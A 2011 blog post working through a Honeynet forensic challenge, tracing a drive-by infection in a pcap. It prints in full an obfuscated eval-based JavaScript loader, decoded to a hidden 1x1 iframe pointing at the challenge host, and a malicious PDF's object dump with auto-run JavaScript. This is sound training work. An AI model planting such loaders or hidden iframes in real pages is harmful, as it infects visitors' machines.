
---
title: "The Deep End"
date: "2011-05-31T12:19:00-04:00"
draft: false
---

I spent much of my 3 day weekend investigating a network traffic dump from a system that got infected with malware. It comes from challenge #6 on Honeynet.org, an interesting site that if you've got time and persistence, you can really teach yourself a lot about computer security and attacks.

What you start with is a pcap file, which is a file format that contains network traffic dumps (collections of packets) that can be read by traffic analysis programs. The most popular one is Wireshark; it has a CLI cousin called tshark as well. Loading the pcap file in wireshark quickly told me there was a flurry of http communication in the dump, so I assumed the malware came from visiting a (perhaps intentionally) compromised website.

With tshark, I got a listing of all URLs visited. I doubt they exist, but I recommend against visiting any of these:
```
$ tshark -r lala.pcap -R http

blog.honeynet.org.my/forensic_challenge
blog.honeynet.org.my/forensic_challenge/getpdf.php
blog.honeynet.org.my/forensic_challenge/fcexploit.pdf
blog.honeynet.org.my/favicon.ico
blog.honeynet.org.my/forensic_challenge/the_real_malware.exe
```
I did a little clean up there for the sake of clarity. Obviously this session was staged, but that's ok, we're in this for a lesson, not for realism. The next step is to look at what the first URL presented to the client. Looking at packet #12, we see when the client requested /forensic_challenge, the server responded with a blob of JavaScript.

Wireshark has a great feature called packet reassembly. Frequently in a TCP transfer, the payload an endpoint is receiving is larger than what TCP supports, so the payload gets broken up across many packets (called fragmentation). Wireshark can figure this out and put all of the pieces back together, and you can export that data to a file. To do this, find the last packet in the sequence (you should see a Reassembled TCP tab at the bottom of the Wireshark GUI), and right click on the row after Hypertext Transfer Protocol that indicates the delivered file. Select Export Selected Packet Bytes, and choose a path.

This is what I did with the server's response. What I got was this mess after gunzipping the payload to stdout:
```
$ gunzip -c hack.gzip
<html>
<body>
<!-- 
	ANYTHING written in this HTML file (the file itself or the code inside it) is solely for the purpose of Honeynet Project Forensic Challenge. 
	Any usage towards this file and its content are at your own risk. 
	The author will not be responsible if any of those brings harm to you or others. 
	This material is for training and educational purposes. 
	You have been warned. 
-->
<script>var DepanNegw=window;var DexeTelae=-44;DexeTelae+=45;XayeZebah='nedajemac';var GaDemee='e5vfqaIVblI5'.replace(/[5fqIVbI5]/g, '');ZavevTa='fazemezarawaseb';var MezRai=parseInt;var DayahDet='zafezed lacet cetexet jevecakemahamaha febenep cafa fezebefe yelaxa xejarer hejefaqazedeka kebeneh petaqe zevexej jenewabahegehar jabevame bayap def vasefezetevamer nefelaba sezaxewe qajeqeme wet reyeqer magemefele xelawece denew jafelev haweqa kel vatabaser mag vejefama xeca canapevezejev benaper gezazevaja zeyaxaf wehekeh jecalava set senajaj re kameken bazafakaqewate zaralek yecele kak s hexebeka heha jeyeteg sase wayefewa tey gawewem wefaravavepayeke xedevec gavayedegeqer casehes watenanesajet jelagal payevexebe pejasep heqefagabexemew deheler vejegeca hece rafenadamenaxe jaz fex hekases pazetepajamelew cerasej nevayezabevepeke pex gey dac g dezaleza kekeqebe peyemaf sevanededa cefagey defef cexaqehe sebex galahal zadaxaran lava falamedejegase set law mefe wa mex ces nam j xaxaped gexeqageb feqeled daseze tehadeh zeheteyera xanahef wepahena xarakel gadazecaq tabexape dareq seje lejegagaxavade haf jaz cewe me cag kem fed h legefaz taw keyacah wefereweverewaze rapecame kas fagavev facez yefeley lareke seperene gav lece gahepegesafeve dez gen yeje s waz qas xap c hademax mezezah qepawehe vad zejates pe cehajeg sabebaseqeseda sekesav nebeda cagareg kec fexewel bejewagedegeqene bajesade lav pasepad baraj xecavan vedepe veranake vej heva kejajemacajada wez saj vele x qaj vad fag y qetamefe jaxa kamatare net zeheweh jeme bale cexebedeleneye dab vev kekaxex jetecajek lejekabe qalef bevegeye caxeb beleteqe r hele saxafexazat baz dehakajegeqeneke met mefepexafecebera qwertyu iop asdfghj klzxcvbnmqwer tyuiopa sdfghjklzxcvbnmq hjklzxc vbnmqwer tyu iopasdfghjklzxc vbnmqwe rtyuiopas dfghjkl zxcvbnmqwertyuio pasdfgh jklzxcvbnmqwert yuiopas dfghjk lzxcvbnm qwertyuiop asdfghj klzxcvbnmqwerty uiopasd fghjkl zxcvbnmq werty uio pasdfghjklzxcvb nmqwert yuiopasdfghjklzx cvbnmqwe rty uiopasd fghjklzx uio pasdfghjklzxcvb nmqwert uiopasdfghjklz qwertyui opasdfghjk xcr vbnmqwertyuiopar sdfghjr klzxcvr bnmqwer rtyuiopasdfghjkr lzxcvbnr mqr wertyur iopasr dfghjkr lzxcvbnmqwertyr uiopasdr fghr jklzxcr vbnmqwertr yuiopar sdfr ghjklr zxcvbnmqwertyuir opasdfr ghjr klzxcvr bnmqwertr yuiopar sr dfghjkr lzxcvbnmqwerr dfghjkr lzxcvbnmqwerr tyuiopr asdfgr hjklzxr cvbnmqwertyuior pasdfgr hjklzxcr vbnmqwr ertyur met mefepexafecebera xanahef wepahena feqeled daseze tabexape dareq zexelede l cefagey defef hademax mezezah req batekeqaheteceh zateyene c zekeqay ratevecek veheleqe k dec tec xece jefexazeqayefes cama bapevexeladet keh lanawebasegecaja qefejev qepetekene dacegas relevaj fecasece ber veyayes ba kajebed savaketegemeqe wepecer lamege tere ratavacevejezax gey dasalaje gav yepakekehe'.split(' ');var ZeJexn='';var SerayYafags=String;var KesXanavn=-50;KesXanavn+=66;XadHef=78;var BeZao=47;BeZao+=-47;var FeceSabejo=-46;FeceSabejo+=48;GebJep=92;var SeWajec='ftr9wogmBwJCW5h6aixrPRCs1ZonjHjdjKueMkD'.replace(/[t9wgBwJW56ixPRs1ZnjHjjKuMkD]/g, '');MaqTa=5;GaDemee=DepanNegw[GaDemee];SeWajec=SerayYafags[SeWajec];for (YajMedei=BeZao;YajMedei<DayahDet.length-1;YajMedei+=FeceSabejo) ZeJexn += SeWajec(MezRai((DayahDet[YajMedei+BeZao].length-1).toString(KesXanavn)+(DayahDet[YajMedei+DexeTelae].length-1).toString(KesXanavn), KesXanavn));GaDemee(ZeJexn);</script>
</body>
</html>
```
Ugh; obfuscated JavaScript. The next step is to figure out what this does. There are two important parts to look at:
```
var GaDemee='e5vfqaIVblI5'.replace(/[5fqIVbI5]/g, '')

GaDemee(ZeJexn);
```
Programmers here should be able work out that GaDemee is assigned the string 'eval'. The last line here is evaluating a variable, so I guessed this was the most important line. It's the last thing in the script, right? Well, I changed GaDemee to 'alert'. In JavaScript this function takes a string and prints it in a dialog box on your screen. So with that change, I loaded the JavaScript in a browser which printed this out:
```
document.write('<iframe scrolling="no" width="1" height="1" border="0" frameborder="0" src="http://blog.honeynet.org.my/forensic_challenge/getpdf.php"></iframe>')
```
Bam! What this does is write a 1 by 1 pixel sized field on the screen that references /forensic_challenge/getpdf.php. Now we know that the site itself is most likely legitimate, but has been compromised with this dirty script.

When the client requested that php file, the server responded with a redirect to it. The client then grabbed the PDF and opened it thanks to Adobe's PDF browser plugin. Using Wireshark again, I dumped out that PDF to a file on my system. For obvious reasons, I decided not to open the PDF on my system with Adobe's reader, but I did do it with vim, a general purpose text editor. Here is the contents of the file after I cut out all of the unprintable (not text) characters:
```
    %PDF-1.3
%°<95>ÝÌ
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%   ANYTHING written in this PDF file (the file itself or the code inside it) is solely for the purpose of Honeynet Project Forensic Challenge.        
%   Any usage towards this file and its content are at your own risk.         
%   The author will not be responsible if any of those brings harm to you or others.         
%   This material is for training and educational purposes.         
%   You have been warned.
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

1 0 obj << /Type /Catalog /PageLayout /SinglePage /Pages 2 0 R /OpenAction 4 0 R >> endobj
2 0 obj << /Type /Pages /Kids [ 3 0 R ] /Count 1 >> endobj
3 0 obj << /Type /Page /MediaBox [ 0 0 612 792 ] /Annots [ 6 0 R 8 0 R ] /Parent 2 0 R >> endobj
4 0 obj << /Type /Action /S /JavaScript /JS 5 0 R >> endobj
5 0 obj
<<^M
    /Length 395^M
    /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]^M
>>stream^M
endstream^M
endobj^M
6 0 obj << /Type /Annot /Subtype /Text /Name /Comment /Rect [ 200 250 300 320 ] /Subj 7 0 R >> endobj
7 0 obj
<<^M
    /Length 8714^M
    /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]^M
>>stream^M
endstream^M
endobj^M
8 0 obj << /Type /Annot /Subtype /Text /Name /Comment /Rect [100 180 300 210 ] /Subj 9 0 R >> endobj
9 0 obj
<<^M
    /Length 10522^M
    /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]^M
>>stream^M
endstream^M
endobj^M
10 0 obj^M
<<^M
    /Length 956^M
    /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]^M
>>stream^M
endstream^M
endobj^M
11 0 obj
<<
/Creator (Scribus 1.3.3.14)
/Producer (Scribus PDF Library 1.3.3.14)
/Title 10 0 R
/Author <>
/Keywords <>
/CreationDate (D:20100910021118)
/ModDate (D:20100910021118)
/Trapped /False
>>  
21 0 obj  
<</F#69lt#65#72 /F#6c#61#74eDe#63#6f#64e/Length 1643/Type /EmbeddedFile>>
stream 
endstream 
endobj 
22 0 obj 
<</V () /Kids [23 0 R] /T (topmostSubform[0]) >>
endobj
23 0 obj
<</Parent 22 0 R /Kids [24 0 R] /T (Page1[0])>>
endobj
24 0 obj
<</MK <</IF <</A [0.0 1.0]>>/TP 1>>/P 25 0 R/FT /Btn/TU (ImageField1)/Ff 65536/Parent 23 0 R/F 4/DA (/CourierStd 10 Tf 0 g)/Subtype /Widget/Type /Annot/T (ImageField1[0])/Rect [107.385 705.147 188.385 709.087]>>
endobj
25 0 obj
<</Rotate 0 /CropBox [0.0 0.0 612.0 792.0]/MediaBox [0.0 0.0 612.0 792.0]/Resources <</XObject >>/Parent 26 0 R/Type /Page/PieceInfo null>>
endobj
26 0 obj
<</Kids [25 0 R]/Type /Pages/Count 1>>
endobj
27 0 obj
<</PageMode /UseAttachments/Pages 26 0 R/MarkInfo <</Marked true>>/Lang (en-us)/AcroForm 28 0 R/Type /Catalog>>
endobj
28 0 obj
<</DA (/Helv 0 Tf 0 g )/XFA [(template) 21 0 R]/Fields [22 0 R]>>
endobj xref
trailer
<</Root 27 0 R/Size 9/Info 11 0 R>>
startxref
14765
%%EOF
```
Computer forensics can be dirty work. At this point I spent a couple hours reading the PDF specification from Adobe, which is perhaps the nerdiest thing I have done in my entire life. It was the driest technical reading I have ever done; I'm sure the technical writer for Adobe is very proud of this 1300+ page document, I think it is a festering carcass of boiler plate drivel and bloat. They literally spent 5 pages explaining how 8-bit bytes can be grouped together to translate into readable text, and that there is a standard on this called ASCII.

Anyway, Adobe ranting aside, I learned how to read and trace how a PDF reader interprets this document. It starts at the trailer section (near the bottom) and reads that in. As you can tell, there are 19 object declarations in this file. An object in a PDF is a part of the document: it can describe a passage of text, an image, page details like margins or borders, and anything else you can think of. Any time you see syntax like this (replace # with an integer):
```
# 0 R
```
That is a reference to another object. So beginning in the trailer section, we have two references: one for object 27 (Root), another for 11 (Info). I then looked at those objects, and looked for references until I had a tree of objects that a PDF reader traverses. Interestingly, a number of these objects are unused! The unused objects are 1 though 9; and I don't know why they are there yet. I'm surprised #4 and #5 are unused, since there appears to be more JavaScript embedded in this thing. My suspicion is that getpdf.php looks at the agent info of the client (is it running IE or Firefox? XP or Linux?) and figures out what PDF to send it. My guess is that a different PDF uses different exploits, and by changing what objects link to the trailer section, different exploits are enacted.

This is all speculation currently. Of the used objects, #21 is the most suspicious:
```
<</F#69lt#65#72 /F#6c#61#74eDe#63#6f#64e/Length 1643/Type /EmbeddedFile>>
```
Look at that mess; it looks like more obfuscation. At this point though, I've been stuck. What I need to do is rip out the data for the object itself, export it to a file, and analyze that. So far, I haven't had much luck with that. I tried PyPDF, but because the PDF has a broken xref table (which I'm convinced was intentional), I cannot read it in. Anyone else have an idea?

